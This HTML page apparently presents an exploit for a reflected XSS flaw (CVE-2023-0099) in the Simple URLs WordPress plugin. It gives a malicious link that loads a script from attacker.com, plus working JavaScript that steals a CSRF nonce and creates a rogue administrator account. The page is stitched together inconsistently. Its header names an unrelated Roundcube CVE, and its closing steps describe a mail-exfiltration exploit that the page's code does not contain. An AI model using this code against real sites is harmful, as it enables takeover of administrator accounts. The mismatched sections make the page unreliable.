<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>simple urls < 115 - Reflected XSS</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <header>
        <h1>Roundcube mail server exploit for CVE-2024-37383 (Stored XSS)</h1>
    </header>
     
    <main>
        <!-- Unified Exploit Container -->
        <section class="exploit-container">

            <pre><code>
# Exploit Title: simple urls < 115 - Reflected XSS
# Google Dork: 
# Exploit Author: AmirZargham
# Vendor Homepage: https://getlasso.co/
# Software Link: https://wordpress.org/plugins/simple-urls/
# Version: < 115
# Tested on: firefox,chrome
# CVE: CVE-2023-0099
# CWE: CWE-79
# Platform: MULTIPLE
# Type: WebApps
            </code></pre>

            <h3>Description</h3>
            <p>The Simple URLs WordPress plugin before 115 does not sanitise and escape some parameters before outputting them back in some pages, leading to Reflected Cross-Site Scripting which could be used against high privilege users such as admin. </p>

            <h3>Usage Info:</h3>
 <p>1. save exploit code to server as javascript file.</p>
 <p>2. in exploit file change value:</p>
   <p>  * user_login: Arbitrary username</p>
   <p>  * pass1: Arbitrary password</p>
   <p>  * pass2: Arbitrary password</p>
   <p>  * email: Arbitrary email</p>
 <p>3. now send malicious link to victim: `https://vulnerable.com/wp-content/plugins/simple-urls/admin/assets/js/import-js.php?search=</script><script src="https://attacker.com/exploit.js"></script>`</p>
 <p>4. know Admin user was created, go to /wp-admin or etc, and login to wordpress panel.</p>




            
            
            <h3>Exploit Code</h3>
            <pre><code>
function getCSRFToken(url, csrf_token_id, func){
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function(){
if(this.readyState == 4 && this.status == 200){
var parser = new DOMParser();
var htmlDocument = parser.parseFromString(this.responseText, "text/html");
var token = htmlDocument.getElementById(csrf_token_id).value;
func(token);
}

};
xhr.open("GET", url, true);
xhr.withCredentials = true;
xhr.send();

}

function addAdmin(token){
var xhr = new XMLHttpRequest();
xhr.open("POST","http://vulnerable.site/wp-admin/user-new.php", true);
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("action=createuser&_wpnonce_create-user=" + token + "&_wp_http_referer=%2Fwp-admin%2Fuser-new.php&user_login=hack-admin&email=hack@gmail.com&first_name=&last_name=&url=&pass1=1234&pass2=1234&pw_weak=on&send_user_notification=1&role=administrator&createuser=Add+New+User");
}

getCSRFToken("http://vulnerable.site/wp-admin/user-new.php", "_wpnonce_create-user", addAdmin);



            </code></pre>

            <h3>Steps to Reproduce</h3>
            <ol>
                <li>Step 1: Setup URLs:</li>
                <p>The main webmail URL (target) and the receiving server URL (attackerserver) are defined as variables at the beginning for easy configuration.</p>
               
 <li>Step 2: Get Total Page Count:</li>
                  <p> The getPageCount function sends a GET request to the main webmail URL to fetch metadata, including the total number of pages (pagecount).</li>
If pagecount is found, it proceeds to loop through each page.</p>
               
 <li>Step 3: Fetch Message IDs from All Pages:</li>
                <p>For each page from 1 to pagecount, it constructs a paginated URL to request that page.
Each pageâ€™s response is checked for instances of add_message_row(NUMBER) using regex, extracting message IDs from each instance and collecting all IDs in a single list.</p>
              
  <li>Step 4: Retrieve Each Message's Content:</li>
                  <p>For each message ID, the code constructs a URL to request detailed data about that message.
It sends a GET request for each message ID URL, receiving the full response HTML.</p>
             
   <li>Step 5: Extract and Clean Message Data:</li>
                  <p>Within each message response, it uses regex to capture the title (message title) and main message content.
Any HTML tags are stripped from the message content to keep only the plain text.</p>
               
 <li>Step 6: Extract and Clean Message Data:</li>
                <p>For each extracted message, a POST request is made to the server endpoint with the title and cleaned message content, URL-encoded for proper transmission.</p>


            </ol>
        </section>
    </main>
</body>
</html>

